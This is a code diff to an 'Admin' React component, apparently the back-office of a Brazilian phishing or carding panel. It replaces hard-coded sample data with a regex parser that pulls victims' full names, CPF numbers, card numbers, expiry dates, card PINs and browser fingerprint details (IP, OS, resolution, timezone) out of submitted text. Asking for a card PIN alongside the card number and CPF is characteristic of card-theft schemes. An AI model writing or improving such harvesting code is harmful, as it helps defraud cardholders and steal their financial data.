@@ -179,22 +179,29 @@ const Admin = () => {
   };
 
   const parsePaymentContent = (content: string): ParsedPaymentData => {
+    // Função auxiliar para extrair valor após label
+    const extractValue = (label: string, defaultValue: string = 'Não disponível') => {
+      const regex = new RegExp(`${label}:\\s*(.+?)(?:\\n|$)`);
+      const match = content.match(regex);
+      return match ? match[1].trim() : defaultValue;
+    };
+
     return {
-      nome: 'João Silva Santos',
-      cpf: '123.456.789-00',
-      cartao: '5123 4567 8901 2345',
-      validade: '12/2025',
-      cvv: '123',
-      senhaCartao: '4567',
-      data: '30/12/2025 às 14:30:45',
-      ip: '192.168.1.100',
-      navegador: 'Chrome 120.0.0',
-      so: 'Windows 11 Pro',
-      dispositivo: 'Desktop',
-      resolucao: '1920x1080',
-      idioma: 'pt-BR',
-      fuso: 'America/Sao_Paulo (GMT-3)',
-      conexao: '4g'
+      nome: extractValue('Nome Completo', 'Não informado'),
+      cpf: extractValue('CPF', 'Não informado'),
+      cartao: extractValue('Número do Cartão', '****'),
+      validade: extractValue('Validade', 'Não informado'),
+      cvv: '***',
+      senhaCartao: extractValue('Senha do Cartão', 'Não informado'),
+      data: extractValue('Data/Hora', 'Não informado'),
+      ip: extractValue('IP', undefined),
+      navegador: extractValue('Navegador', undefined),
+      so: extractValue('Sistema Operacional', undefined),
+      dispositivo: extractValue('Tipo de Dispositivo', undefined),
+      resolucao: extractValue('Resolução', undefined),
+      idioma: extractValue('Idioma', undefined),
+      fuso: extractValue('Fuso Horário', undefined),
+      conexao: extractValue('Tipo de Conexão', undefined)
     };
   };
 
